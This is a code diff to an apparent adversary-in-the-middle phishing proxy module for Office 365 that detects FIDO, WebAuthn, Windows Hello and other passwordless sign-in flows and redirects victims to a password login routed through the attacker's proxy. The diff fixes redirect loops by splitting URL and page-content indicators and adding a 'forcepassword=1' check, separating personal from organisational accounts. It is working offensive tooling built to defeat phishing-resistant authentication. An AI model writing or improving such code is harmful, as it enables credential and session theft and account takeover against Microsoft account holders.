@@ -716,9 +716,8 @@ class Office365Module(BaseModule):
                     self.log(f"[AiTM] Processing HTML content, size: {len(content_str)} chars")
                     
                     # Check for FIDO/passwordless authentication redirects and block them
-                    fido_indicators = [
-                        'login.microsoft.com/consumers/fido',
-                        'login.microsoftonline.com/consumers/fido',
+                    # Exclude common URL parameters that cause redirect loops
+                    fido_content_indicators = [
                         'passwordless',
                         'WebAuthn',
                         'authenticator',
@@ -726,31 +725,38 @@ class Office365Module(BaseModule):
                         'biometric',
                         'Face, fingerprint, PIN',
                         'Windows Hello',
-                        'fido/get',
-                        'mkt=EN-US&lc=1033&uiflavor=web',
                         'AADSTS135004',
                         'Invalid postBackUrl'
                     ]
                     
-                    # Also check the current URL for FIDO indicators
-                    current_url = target_url.lower()
-                    fido_in_url = any(indicator in current_url for indicator in fido_indicators)
-                    fido_in_content = any(indicator in content_str for indicator in fido_indicators)
+                    # Check for FIDO-specific URL paths
+                    fido_url_indicators = [
+                        '/consumers/fido',
+                        '/fido/get'
+                    ]
                     
-                    # If FIDO flow detected, redirect to password-based flow through proxy
-                    if fido_in_url or fido_in_content:
+                    # Check URL and content for FIDO indicators
+                    current_url = target_url.lower()
+                    fido_in_url = any(indicator in current_url for indicator in fido_url_indicators)
+                    fido_in_content = any(indicator in content_str for indicator in fido_content_indicators)
+                    
+                    # Check if we're already in a forced password flow to prevent loops
+                    already_forcing_password = 'forcepassword=1' in current_url
+                    
+                    # If FIDO flow detected and not already forcing password, redirect to password-based flow
+                    if (fido_in_url or fido_in_content) and not already_forcing_password:
                         self.log(f"[AiTM] FIDO/passwordless flow detected, redirecting to password flow")
                         if hasattr(self, 'user') and self.user:
                             personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
                             is_personal = any(domain in self.user.lower() for domain in personal_domains)
                             
                             if is_personal:
-                                # Force redirect to password login for personal accounts - THROUGH PROXY
-                                password_params = f"username={self.user}&wa=wsignin1.0&wtrealm=uri:WindowsLiveID&wctx=bk%3d1456841834%26bru%3dhttps%253a%252f%252fwww.office.com%252f&wreply=https://www.office.com/landingv2.aspx&lc=1033&id=292666&mkt=EN-US&psi=office365&uiflavor=web&forcepassword=1&amtcb=1"
+                                # Simple redirect to password login for personal accounts - avoid loop parameters
+                                password_params = f"username={self.user}&forcepassword=1"
                                 password_url = f"https://{current_host}/proxy/login.srf?{password_params}"
                                 return redirect(password_url, code=302)
                             else:
-                                # Force redirect to password login for organizational accounts - THROUGH PROXY
+                                # Force redirect to password login for organizational accounts
                                 password_params = f"username={self.user}&login_hint={self.user}&forcepassword=1"
                                 password_url = f"https://{current_host}/proxy/common/login?{password_params}"
                                 return redirect(password_url, code=302)
